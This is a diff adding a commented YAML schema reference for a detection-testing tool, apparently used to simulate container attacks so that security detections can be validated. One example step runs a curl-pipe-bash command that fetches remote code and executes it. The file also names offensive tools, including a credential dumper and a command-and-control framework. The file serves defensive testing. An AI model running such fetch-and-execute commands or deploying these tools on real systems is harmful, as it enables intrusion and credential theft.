@@ -1,0 +1,227 @@
+# scenarios/_schema.yml
+# CortexSim Scenario Schema Reference
+#
+# This file documents every field accepted by the scenario loader (core/engine/scenario_loader.py).
+# It is a documentation artifact — NOT a runnable scenario.
+# All fields marked (required) must be present. Fields marked (optional) may be omitted.
+#
+# The scenario loader validates each scenario YAML against this schema using Pydantic.
+# Invalid files are rejected at startup with a descriptive error message.
+# ─────────────────────────────────────────────────────────────────────────────
+
+# ── Identity ────────────────────────────────────────────────────────────────
+
+scenario_id: "SIM-{PLANE}-{NNN}"
+# (required) Unique stable identifier. Format: SIM-CDR-001, SIM-EDR-005, etc.
+# Never reuse an ID, even after deprecation.
+
+name: "Human-readable scenario name"
+# (required) Short descriptive title. Shown in UI scenario browser.
+
+version: "1.0"
+# (required) Semantic version string. Increment minor on step changes, major on schema changes.
+
+status: "active"
+# (required) Lifecycle state. One of: active | draft | deprecated
+# Deprecated scenarios are hidden from UI but preserved in YAML for audit history.
+
+# ── Detection Plane ─────────────────────────────────────────────────────────
+
+plane: "CDR"
+# (required) Primary detection plane this scenario targets.
+# One of: EDR | CDR | NDR | ITDR | CLOUD_APP | ANALYTICS
+# ANALYTICS is reserved for multi-plane correlation scenarios.
+
+detection_types:
+  - BIOC
+  - Analytics
+# (required) List of Cortex detection engine types expected to fire.
+# Valid values: BIOC | Analytics | IOC
+# At least one value required.
+
+# ── UC/TC Alignment ──────────────────────────────────────────────────────────
+
+uc_ref: "UCS-CDR-01"
+# (required) Use Case reference ID. Maps to the master UC/TC YAML schema library
+# in docs/uc_tc_mapping/. Format: UCS-{PLANE}-{NN}
+
+tc_ref: "TC-CDR-01"
+# (required) Test Case reference ID within the use case. Format: TC-{PLANE}-{NN}
+
+uc_name: "Container Runtime Threat Detection"
+# (required) Human-readable name of the parent Use Case.
+
+tc_name: "Container Enumeration and Discovery"
+# (required) Human-readable name of this Test Case.
+
+# ── MITRE ATT&CK Mapping ─────────────────────────────────────────────────────
+
+mitre_tactic: "TA0007"
+# (required) MITRE ATT&CK tactic ID. See https://attack.mitre.org/tactics/
+
+mitre_tactic_name: "Discovery"
+# (required) Human-readable tactic name matching the tactic ID.
+
+mitre_technique: "T1613"
+# (required) Primary MITRE ATT&CK technique ID. May include sub-technique
+# notation, e.g. T1059.004 for Shell Script.
+
+mitre_technique_name: "Container and Resource Discovery"
+# (required) Human-readable technique name matching the technique ID.
+
+additional_techniques:
+  - technique: "T1082"
+    name: "System Information Discovery"
+# (optional) Additional MITRE techniques exercised by this scenario.
+# List of {technique, name} pairs.
+
+# ── Threat Intelligence ──────────────────────────────────────────────────────
+
+threat_report: "Unit42 - Large-Scale Monero Cryptomining Operation"
+# (required) Title of the threat report or intelligence source this scenario
+# is modeled on. Used for traceability and docs/threat_report_index.md linkage.
+
+threat_report_url: "https://unit42.paloaltonetworks.com/example-report/"
+# (optional) Direct URL to the referenced threat report.
+
+# ── Execution Configuration ───────────────────────────────────────────────────
+
+execution_identity:
+  default: "container-runtime"
+  # (required) The identity used when none is selected in the UI.
+  options:
+    - container-runtime
+    - root
+    - www-data
+  # (required) Full list of valid identities for this scenario.
+  # Identity values map to harness modes in agent/identity/harness.go:
+  #   container-runtime  → direct execution inside container context
+  #   root               → direct root execution (no harness wrapper)
+  #   www-data           → runuser -l www-data -c "..."
+  #   nobody             → su -s /bin/bash nobody -c "..."
+  #   node               → sudo -u node ...
+  #   postgres           → sudo -u postgres ...
+  #   svc-backup         → runuser -l svc-backup -c "..."
+
+push_supported: true
+# (required) Whether a self-contained bash/k8s bundle can be generated for
+# this scenario via the push script generator (core/engine/push_generator.py).
+
+pull_supported: true
+# (required) Whether the Go beacon agent can execute this scenario in pull mode.
+
+# ── External Tools ───────────────────────────────────────────────────────────
+
+external_tools:
+  - name: deepce
+    # (required) Tool name. Must match an entry in core/tools/registry.py if
+    # tool lifecycle management is needed, OR use install_inline: true for
+    # runtime download.
+    source: "https://github.com/stealthcopter/deepce"
+    # (required) Canonical source URL for the tool.
+    type: "script"
+    # (required) Tool artifact type. One of: script | binary | service
+    install_inline: true
+    # (optional, default: false) If true, the tool is downloaded at runtime
+    # inside the simulation step rather than pre-installed via the Tool
+    # Instantiation Layer. Used for small scripts fetched via curl.
+
+  - name: kubectl
+    source: "https://kubernetes.io/docs/tasks/tools/"
+    type: "binary"
+    install_inline: false
+    # install_inline: false means the tool must be pre-installed on the target.
+    # The push script generator will emit a dependency check for this tool.
+
+# ── Execution Steps ──────────────────────────────────────────────────────────
+
+steps:
+  - id: "step-01"
+    # (required) Stable step identifier. Used in logs and result mapping.
+    # Format: step-NN (zero-padded two digits).
+
+    name: "Install enumeration dependencies"
+    # (required) Human-readable step name shown in UI and bash bundle header.
+
+    command: "apk add --no-cache curl wget"
+    # (required) The shell command to execute. Verbatim — no interpolation by
+    # SimCore. The identity harness wraps this command at execution time.
+    # For multi-line commands, use YAML literal block scalar (|).
+
+    identity: "container-runtime"
+    # (required) Identity context for this step. Must be one of the values
+    # listed in execution_identity.options above.
+    # The Go agent and push generator both enforce this via identity harness.
+
+    mitre_technique: "T1059.004"
+    # (required) MITRE technique exercised by this specific step.
+    # May differ from the scenario-level mitre_technique.
+
+    expected_detections:
+      - plane: CDR
+        # (required) Detection plane expected to produce signal.
+        type: Analytics
+        # (required) Detection type. One of: BIOC | Analytics | IOC
+        description: "Package manager execution in container — unusual install pattern"
+        # (required) Human-readable description of the expected alert/detection.
+        # Used in ResultsViewer to show expected vs observed.
+
+  - id: "step-02"
+    name: "Download and execute tool"
+    command: "curl -sSL https://example.com/tool.sh | bash"
+    identity: "container-runtime"
+    mitre_technique: "T1613"
+    expected_detections:
+      - plane: CDR
+        type: BIOC
+        description: "Tool signature detection"
+      - plane: CDR
+        type: Analytics
+        description: "Suspicious curl-pipe-bash pattern in container context"
+
+# Steps can have 1–10 entries. At least 3 steps required per scenario.
+# Steps execute in list order. Each step is independently logged and reported.
+
+# ── Cleanup ──────────────────────────────────────────────────────────────────
+
+cleanup:
+  commands:
+    - "rm -f /tmp/deepce.sh /tmp/enum_output.txt"
+    # (required) List of shell commands to run after scenario completes or fails.
+    # These run as root/container-runtime regardless of step identity.
+    # Must fully remove all artifacts created during execution.
+  k8s_teardown: "kubectl delete -f {manifest_path}"
+  # (optional) kubectl command to clean up K8s resources. The push generator
+  # substitutes {manifest_path} with the actual generated manifest path.
+
+# ── Metadata ─────────────────────────────────────────────────────────────────
+
+author: "Henry Reed"
+# (required) Author name. Used in generated bash bundle headers and audit logs.
+
+created: "2026-04-12"
+# (required) ISO 8601 date of initial creation. Never update this field.
+
+last_updated: "2026-04-12"
+# (required) ISO 8601 date of last modification. Update on every change.
+
+tags:
+  - container-security
+  - enumeration
+  - cloud-native
+# (optional) Free-form tags for filtering and search. Lowercase, hyphen-separated.
+
+# ── IaC Generator Hints (optional) ──────────────────────────────────────────
+
+required_content:
+  - repo: "huntergregal/mimipenguin"
+  - repo: "bishopfox/sliver"
+# (optional) Open-source tools the scenario expects to find installed.
+# Consumed by the IaC generator UI to auto-suggest content modules.
+
+infra_modules_needed:
+  - edr
+  - base
+# (optional) Hints which IaC generator modules should be selected when this
+# scenario is in the DC's bookmark set. Values: base, edr, cdr, ndr, itdr,
+# tim, asm, cspm, content-library, telemetry-replay.
